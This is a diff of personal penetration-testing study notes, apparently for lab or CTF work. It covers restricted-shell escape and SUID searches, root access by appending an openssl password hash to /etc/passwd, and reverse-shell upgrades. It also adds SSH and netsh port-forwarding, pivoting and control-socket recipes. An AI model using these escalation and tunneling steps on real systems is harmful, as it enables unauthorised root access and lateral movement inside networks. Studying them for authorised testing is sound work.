@@ -13,6 +13,7 @@ Contents
    3. Vulnerability Research    #explore identified services and the use of the target system
    4. Exploit                   # get low privilige shell
    5. Post-Exploit&&Privilege Escalation  # owned the target
+      search for other users, creds, network surface, processes, kernal version, 
 
 
     
@@ -351,23 +352,23 @@ Contents
 6. Post-Exploitation && Privilege escalation
      Goal
      Restricted low-priv shell --> Unrestricted low-priv shell --> Unrestricted high-priv shell -->Get more info
-    4.0.Priviliege Escalation      
-      4.0.1 Restriced Shell excape  
+    6.1 Priviliege Escalation      
+      6.1.1 Restriced Shell excape  
            https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
            https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html
            https://guif.re/linuxeop
-               1. $ bin/sh
+                  $ bin/sh
                   $ echo $PATH
                   $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
                   $ export SHELL=/bin/bash
-               2. Hit Double tap to search for available command.
+               Hit Double tap to search for available command.
                   https://gtfobins.github.io/ --> search for shell
-               3. Host: ssh -t bash -i compromised.pem id@ip
+               Host: ssh -t bash -i compromised.pem id@ip
                   $ echo $PATH
                   $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
                   $ export SHELL=/bin/bash
            find / -perm 4755 2>/dev/null
-               4. Copy /etc/passwd
+               Copy /etc/passwd
                  Use openssl to create hash 
                         Syntax: openssl passwd -1 -salt pkong pass123  
                  Put it on the bottom of passwd
@@ -379,7 +380,7 @@ Contents
                
                   
                   
-         4.0.1.1 nc interactive shell
+             nc interactive shell
                         # In reverse shell 
                               python -c 'import pty; pty.spawn("/bin/bash")' 
                               Ctrl-Z 
@@ -394,8 +395,7 @@ Contents
           
           
                                                                   
-      4.0.2 Searchsploit for remote execution 
-         4.0.2.1 
+     Searchsploit for remote execution 
                     # e.g. searchsploit apach james  35513.py
                     # Download and modify the python script. 
                     # Verify that the script is working
@@ -618,7 +618,34 @@ https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
    set LPORT 4444
    exploit -j
    
-   
+Tunneling
+      Local Port Forward
+      -L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
+      Remote Port Forward
+      ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT
+   Tunneling in windows  -PortProxy
+      netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
+
+      netsh interface portproxy show all
+      netsh interface portproxy delete v4tov4 listenport=<LocalPort>
+      netsh interface portproxy reset
+
+   Setting up control socket
+      Two main ways to configure
+           Command Line Method:
+                  ssh -M -S /tmp/<target name> root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
+                         -M for master mode
+                         -S control for socket path.
+                   -o 'ControlPath=/tmp/<target name>'
+                        to use it. 
+                   -M -S /tmp/s
+           Configuration File Method:
+                  /ssh_config
+                  HostName machine1.example.org
+                  ControlPath ~/.ssh/controlmasters/%r@%h:%p
+                  ControlMaster auto
+                  ControlPersist 10m
+                  
                         
        
 
@@ -762,6 +789,10 @@ pivot stuff
 https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
 https://www.puckiestyle.nl/pivot-with-chisel/
+
+
+
+
 
 Port forwarding
 install Go 
